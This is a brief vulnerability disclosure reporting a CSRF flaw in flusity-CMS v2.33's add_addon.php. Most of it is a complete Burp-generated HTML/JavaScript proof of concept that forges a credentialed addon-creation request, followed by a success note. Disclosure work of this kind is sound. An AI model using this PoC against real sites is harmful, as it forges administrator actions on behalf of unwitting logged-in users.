target:https://github.com/flusity/flusity-CMS
version: v2.33

flusity-CMS v2.33 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /cover/addons/jd_simple_zer/action/add_addon.php

![1](https://github.com/TinkAnet/cve/assets/118334129/b1ce0454-9538-4f48-b802-fa8964325cb3)

Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1\/cover\/addons\/jd_simple_zer\/action\/add_addon.php", true);
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------5207820387266874113856759649");
        xhr.withCredentials = true;
        var body = "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"csrf_token\"\r\n" + 
          "\r\n" + 
          "822f362b71f773a5679ce91653e852f462de9d427dd71bab4b379624ad4c419c\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"mode\"\r\n" + 
          "\r\n" + 
          "create\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"addon_post_edit_id\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"id\"\r\n" + 
          "\r\n" + 
          "14\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"addon_place_id\"\r\n" + 
          "\r\n" + 
          "7\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"addon_menu_id\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"title\"\r\n" + 
          "\r\n" + 
          "cs\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "123\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"lang_en_title\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"lang_en_description\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"readmore\"\r\n" + 
          "\r\n" + 
          "123\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"file_id\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"file_id\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649\r\n" + 
          "Content-Disposition: form-data; name=\"db_img_name\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------5207820387266874113856759649--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>


```

![2](https://github.com/TinkAnet/cve/assets/118334129/126a9de0-42fb-4b35-acb7-fa933c2b188b)


Successed

![3](https://github.com/TinkAnet/cve/assets/118334129/d321d76b-d3ac-4db3-a8c6-a25ebb959729)